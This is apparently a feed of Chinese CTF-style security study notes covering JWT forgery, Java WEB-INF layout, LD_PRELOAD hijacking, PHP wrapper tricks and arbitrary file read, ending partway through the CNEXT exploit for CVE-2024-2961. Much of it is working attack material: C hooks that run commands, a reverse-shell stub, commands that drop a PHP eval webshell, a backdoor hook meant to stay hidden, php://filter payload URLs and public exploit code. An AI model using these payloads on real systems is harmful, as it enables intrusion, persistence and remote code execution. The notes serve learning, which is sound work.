    <content type="html"><![CDATA[<h2 id="jwt的构成"><a href="#jwt的构成" class="headerlink" title="jwt的构成"></a>jwt的构成</h2><p>xxx.xxx.xxx<br>第一部分标示算法等，第二部分是信息，二者均用base64编码<br>第三部分是签名（用第一部分的算法和私钥）</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><ol><li>未签名</li></ol><p>所有的jwt都合法，任意修改数据</p><ol start="2"><li>允许使用none进行签名</li></ol><p>把第一部分的算法改成<code>none</code>, 再丢弃最后的签名，随意篡改第二部分的信息</p><ol start="3"><li>弱密钥</li></ol><p><code>python jwt_tool.py &quot;&lt;JWT&gt;&quot; -C -d jwt-common.txt</code><br>其中<code>jwt-common.txt</code>是密钥字典</p>]]></content>
    
    
    <categories>
      
      <category>jwt</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB-INF</title>
    <link href="/blogs/java/web-inf/"/>
    <url>/blogs/java/web-inf/</url>
    
    <content type="html"><![CDATA[<p><strong>WEB-INF</strong> 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<strong>web.xml</strong>文件对要访问的文件进行相应映射才能访问。</p><p> WEB-INF主要包含以下文件或目录：</p><ol><li>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</li><li>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LD_PRELOAD劫持</title>
    <link href="/blogs/uncategorized/ld-preload%E5%8A%AB%E6%8C%81/"/>
    <url>/blogs/uncategorized/ld-preload%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<p><a href="https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/">学习文章</a></p><p>用命令<code>readelf -Ws /usr/bin/ls</code>看linux命令中执行了调用了哪些函数,然后再劫持这些函数</p><p>可能实现中有,但是执行时没用到, 所以多劫持几个试试</p><p><code>ls</code> –&gt; <code>strncmp</code><br><code>whoami</code> –&gt; <code>puts</code></p><p>man 3 strncmp 可以看到函数定义</p><h2 id="防止无穷递归"><a href="#防止无穷递归" class="headerlink" title="防止无穷递归"></a>防止无穷递归</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2, <span class="hljs-type">size_t</span> n)</span>&#123;<br>    <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="奇怪的错误"><a href="#奇怪的错误" class="headerlink" title="奇怪的错误"></a>奇怪的错误</h2><p>报segmentation fault</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -i ...&quot;</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hacked!!!&quot;</span>);  <span class="hljs-comment">// printf(&quot;hacked!!!\n&quot;); 报错!!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// ----------- or -----</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[0]);?&gt;&#x27; &gt; /var/www/html/gxngxngxn.php&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>去掉<code>\n</code>后又可以了<br>(神奇的gpt告诉我是因为printf中调用了puts, 所以递归爆栈了, \n与刷新缓冲区有关… 管他呢)</p><p>getenv也会调用puts,所以用上面的方法也不行</p><p>可以用static int flag作为标记,防止递归调用, 见下例</p><h2 id="隐匿后门"><a href="#隐匿后门" class="headerlink" title="隐匿后门"></a>隐匿后门</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> &#123;<br>    <span class="hljs-type">int</span> (*original_puts)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;puts&quot;</span>);<br>    <span class="hljs-type">int</span> result = original_puts(s);<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (in_hook) &#123; <span class="hljs-comment">// 防止递归调用</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    in_hook = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts hooked!\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>(爱来自gpt)<br>可以使得原来的命令正常执行,用于后门隐匿</p><h2 id="so-文件加载触发"><a href="#so-文件加载触发" class="headerlink" title=".so 文件加载触发"></a>.so 文件加载触发</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i am hacker!!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="突破disable-function"><a href="#突破disable-function" class="headerlink" title="突破disable_function"></a>突破disable_function</h2><p>disable_function只在当前进程生效<br>mail 或 error_log函数产生一个新进程, 并执行了getuid函数<br>劫持getuid函数 或 采用加载触发即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/blogs/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/blogs/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>php伪协议有</p><ol><li>php:&#x2F;&#x2F;filter</li><li>php:&#x2F;&#x2F;input</li></ol><p>可用于的场景</p><ol><li>配合文件包含读取文件内容</li><li></li></ol><h2 id="filter协议"><a href="#filter协议" class="headerlink" title="filter协议"></a>filter协议</h2><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1">p神</a><br>由于包含php文件会直接执行, 而不会显示代码, 因此需要用到filter协议来读取php代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://ip:port/index.php?filename=<br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure><p>在某些编码被过滤的时候,更通用的是</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">32771</span>/index.php?filename=<br><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;<span class="hljs-regexp">/resource=/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure><p>其中encoding可选的编码方式见php-supported-encodings</p><p>必要时可以两个爆破点进行爆破</p><h2 id="input协议"><a href="#input协议" class="headerlink" title="input协议"></a>input协议</h2><p>php:&#x2F;&#x2F;input用于文件包含需要开启allow_url_include: On(默认关闭)<br>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php://input&quot;</span><br></code></pre></td></tr></table></figure><p>通常将报错,fail to open…</p><p>可以用于读取内容,需要 allow_url_fopen: On(默认开启)<br>如</p><pre><code class="language-php">&lt;?phpfile_get_contents(&quot;php://input&quot;)</code></pre>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php任意文件读</title>
    <link href="/blogs/php/php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB/"/>
    <url>/blogs/php/php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="可以尝试读取的文件"><a href="#可以尝试读取的文件" class="headerlink" title="可以尝试读取的文件"></a>可以尝试读取的文件</h2><ol><li>flag</li><li>&#x2F;flag</li><li>&#x2F;fl4g</li><li>fl4g</li><li>&#x2F;proc&#x2F;self&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;cmdline</li><li>&#x2F;docker-entrypoint.sh</li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-comment"># 拷贝容器入口点脚本</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./service/docker-entrypoint.sh /docker-entrypoint.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /docker-entrypoint.sh</span><br></code></pre></td></tr></table></figure><h2 id="任意文件读取-有回显-可能可以转化为rce"><a href="#任意文件读取-有回显-可能可以转化为rce" class="headerlink" title="任意文件读取(有回显)可能可以转化为rce"></a>任意文件读取(有回显)可能可以转化为rce</h2><p><a href="https://xz.aliyun.com/news/14986">学习文章</a><br>CVE-2024-2961</p><p><strong>题目</strong><br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python exp.py &lt;url&gt; <span class="hljs-string">&quot;echo &#x27;&lt;?=@eval(\$_POST[1]);?&gt;&#x27; &gt; shell.php&quot;</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ConnectionError, ChunkedEncodingError<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 如果把参数手动放到url里面，那么记得手动url编码</span><br>        <span class="hljs-comment"># url = (changedUrl).replace(&quot;+&quot;,&quot;%2b&quot;)</span><br>        <span 